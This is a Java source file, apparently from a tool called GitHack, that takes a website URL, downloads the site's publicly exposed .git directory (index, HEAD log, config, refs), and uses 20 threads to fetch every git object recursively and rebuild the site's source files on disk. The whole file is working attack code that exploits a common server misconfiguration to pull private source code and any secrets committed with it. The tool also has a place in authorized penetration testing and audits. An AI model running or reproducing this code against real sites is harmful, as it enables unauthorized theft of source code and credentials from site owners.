/**
 * JHack.net
 * Copyright (c) 2004-2016 All Rights Reserved.
 */
package com.jgithack.hack;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentMap;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.jgithack.core.IndexParse;
import com.jgithack.core.ObjectParse;
import com.jgithack.core.PageDownload;
import com.jgithack.io.FileUtils;
import com.jgithack.lang.StringUtil;
import com.jgithack.log.LogUtils;
import com.jgithack.model.IndexEntry;

/**
 * GitHack
 * 
 * @author Albert Wang
 * @version $Id: GitHack.java, V0.1 2016-10-29 20:10:00, jawangwen@qq.com $
 */
public class GitHack {
    private final Pattern           logPattern  = Pattern.compile("^([0-9a-zA-Z]+) ([0-9a-zA-Z]+)");

    private static Set<String>      sha1Skipped = new HashSet<String>();
    {
        sha1Skipped.add("0000000000000000000000000000000000000000");
    }

    private String                  rootUrl     = "";
    private String                  downloadDir = null;
    private int                     tryTimes    = 3;
    private boolean                 nativeFirst = false;
    private boolean                 skipError   = true;

    private int                     threadSize  = 20;
    private BlockingQueue<Runnable> tasks       = new LinkedBlockingQueue<Runnable>();
    private ThreadPoolExecutor      executor    = new ThreadPoolExecutor(threadSize, threadSize,
                                                    30, TimeUnit.SECONDS, tasks);

    public GitHack() {
    }

    public GitHack(String rootUrl) throws MalformedURLException {
        this.withRootUrl(rootUrl).withDownloadDir(this.rootUrl.replace("http://", ""));
    }

    public GitHack(String rootUrl, String downloadDir) {
        this.withRootUrl(rootUrl).withDownloadDir(downloadDir);
    }

    public GitHack withRootUrl(String rootUrl) {
        this.rootUrl = StringUtil.trimToEmpty(rootUrl).replaceFirst("/(\\w*?)\\.(\\w+)$", "")
            .replaceAll("/$", "");
        return this;
    }

    public GitHack withDownloadDir(String downloadDir) {
        this.downloadDir = StringUtil.trimToEmpty(downloadDir).replaceAll("/$", "");
        return this;
    }

    public GitHack withTryTimes(int tryTimes) {
        this.tryTimes = tryTimes;
        return this;
    }

    public GitHack nativeFirst(boolean enable) {
        this.nativeFirst = enable;
        return this;
    }

    public GitHack skipError(boolean enable) {
        this.skipError = enable;
        return this;
    }

    public GitHack withThreadSize(int threadSize) {
        this.threadSize = threadSize;
        return this;
    }

    /**
     * Build hack, i.e. object directories
     * 
     * @return
     * @throws IOException
     * @throws InterruptedException 
     */
    public GitHack build() throws IOException, InterruptedException {
        boolean done = false;
        long startTime = System.currentTimeMillis();

        try {
            LogUtils.info("GitHack build start");

            assureParams();

            LogUtils.info("rootUrl:     %s", rootUrl);
            LogUtils.info("downloadDir: %s", downloadDir);

            downloadFile("/.git/index");
            downloadFile("/.git/logs/HEAD");
            downloadFile("/.git/config");
            downloadFile("/.git/COMMIT_EDITMSG");
            downloadFile("/.git/HEAD");
            downloadFile("/.git/refs/heads/master");

            downloadObjects();

            done = true;

            LogUtils.info("GitHack build success");
        } finally {
            LogUtils.info("GitHack done(%s) cost %ss", done ? "Y" : "N",
                (System.currentTimeMillis() - startTime) / 1000);
        }

        return this;
    }

    public void checkout() throws IOException {
        LogUtils.info("GitHack checkout start");

        for (IndexEntry entry : IndexParse.load(downloadDir + "/.git/index").getIndexEntries()) {
            downloadObject(entry.getSha1());
            restoreObjectToFile(entry.getSha1(), entry.getName());
        }

        LogUtils.info("GitHack checkout success");
    }

    public void close() {
        executor.shutdownNow();
        LogUtils.info("GitHack is closing..");
    }

    private String downloadFile(String pagePath) throws IOException {
        try {
            String requestUrl = rootUrl + pagePath;
            String filePath = downloadDir + pagePath;
            long fileSize = new PageDownload(requestUrl).withTryTimes(tryTimes)
                .nativeFirst(nativeFirst).saveAs(filePath);
            if (fileSize <= 0) {
                throw new IOException("None read from page: " + requestUrl);
            }
            LogUtils.info("download file \"%s\", size: %s", pagePath, fileSize);
            return filePath;
        } catch (IOException exception) {
            if (!skipError) {
                throw exception;
            }
            LogUtils.error(exception, "download page failed, file: %s", pagePath);
            return null;
        }
    }

    private void downloadObjects() throws IOException, InterruptedException {
        AtomicInteger taskCount = new AtomicInteger(0);
        ConcurrentMap<String, IOException> result = new ConcurrentHashMap<String, IOException>();
        try {
            for (String sha1 : readCommitSha1(downloadDir + "/.git/logs/HEAD")) {
                startObjectDownload(sha1, taskCount, result);
            }

            while (taskCount.get() > 0) {
                Thread.sleep(1000);
            }

            for (IOException exception : result.values()) {
                if (!(exception instanceof NotException)) {
                    throw exception;
                }
            }
        } catch (IOException exception) {
            if (!skipError) {
                throw new IOException("download objects failed", exception);
            }
            LogUtils.error(exception, "download objects failed");
        }
    }

    private String downloadObject(String sha1) throws IOException {
        try {
            String folder = String.format("/.git/objects/%s/%s", sha1.substring(0, 2),
                sha1.substring(2));
            String requestUrl = rootUrl + folder;
            String objectPath = downloadDir + folder;
            long objectSize = new PageDownload(requestUrl).withTryTimes(tryTimes)
                .nativeFirst(nativeFirst).saveAs(objectPath);
            if (objectSize <= 0) {
                throw new IOException("None read from requestUrl: " + requestUrl);
            }
            LogUtils.info("download object, sha1: %s, size: %s", sha1, objectSize);
            return objectPath;
        } catch (IOException exception) {
            if (!skipError) {
                throw exception;
            }
            LogUtils.error(exception, "download object failed, sha1: %s", sha1);
        }
        return null;
    }

    private void restoreObjectToFile(String sha1, String filePath) throws IOException {
        filePath = filePath.startsWith("/") ? filePath : "/" + filePath;
        LogUtils.info("restore file: %s, sha1: %s", filePath, sha1);
        try {
            // 下载文件
            String folder = String.format("/.git/objects/%s/%s", sha1.substring(0, 2),
                sha1.substring(2));

            // 解压文件
            String fileContent = ObjectParse.load(downloadDir + folder).catFile();

            // 存储文件
            File localFile = new File(downloadDir + filePath);
            FileUtils.writeStringToFile(localFile, fileContent.replaceFirst("^blob \\d+\\x00", ""));
        } catch (IOException exception) {
            if (!skipError) {
                throw exception;
            }
            LogUtils.error(exception, "download failed, filePath: %s, sha1: %s", filePath, sha1);
        }
    }

    /**
     * 解压对象为文本
     * 
     * @param filePath      解决路径
     * @return
     * @throws IOException
     */
    private void assureParams() throws IOException {
        if (StringUtil.isBlank(rootUrl)) {
            throw new IOException("Empty rootUrl");
        }
        if (!rootUrl.toLowerCase().startsWith("http://")) {
            throw new IOException("Invalid rootUrl(not start with http://): " + rootUrl);
        }
        if (StringUtil.isBlank(downloadDir)) {
            this.withDownloadDir(this.rootUrl.replace("http://", ""));
        }
    }

    private Set<String> readCommitSha1(String logPath) throws IOException {
        Set<String> result = new HashSet<String>();

        File file = new File(logPath);
        for (String line : FileUtils.readLines(file)) {
            Matcher matcher = logPattern.matcher(line);
            if (matcher.find()) {
                if (!sha1Skipped.contains(matcher.group(1))) {
                    result.add(matcher.group(1));
                }
                if (!sha1Skipped.contains(matcher.group(2))) {
                    result.add(matcher.group(2));
                }
            }
        }

        return result;
    }

    private void startObjectDownload(String sha1, AtomicInteger taskCount,
                                     ConcurrentMap<String, IOException> result) {
        if (!result.containsKey(sha1)) {
            if (result.putIfAbsent(sha1, new NotException()) == null) {
                executor.execute(new ObjectDownload(sha1, taskCount, result));
                taskCount.getAndIncrement();
            }
        }
    }

    /** 非异常，GIT对象下载时作为哨兵 */
    private class NotException extends IOException {
        /**  */
        private static final long serialVersionUID = 8780565940390318109L;
    }

    private class ObjectDownload implements Runnable {
        private String                             sha1;
        private AtomicInteger                      taskCount;
        private ConcurrentMap<String, IOException> result;

        public ObjectDownload(String sha1, AtomicInteger taskCount,
                              ConcurrentMap<String, IOException> result) {
            this.sha1 = sha1;
            this.taskCount = taskCount;
            this.result = result;
        }

        @Override
        public void run() {
            try {
                String objectPath = downloadObject(sha1);
                if (StringUtil.isNotBlank(objectPath)) {
                    for (String sha1 : ObjectParse.load(objectPath).findRelatedSha1()) {
                        startObjectDownload(sha1, taskCount, result);
                    }
                }
                result.put(sha1, new NotException());
            } catch (IOException exception) {
                LogUtils.error(exception, "ObjectDownload detect error! sha1: %s", sha1);
                result.put(sha1, exception);
            } finally {
                taskCount.getAndDecrement();
            }
        }
    }
}
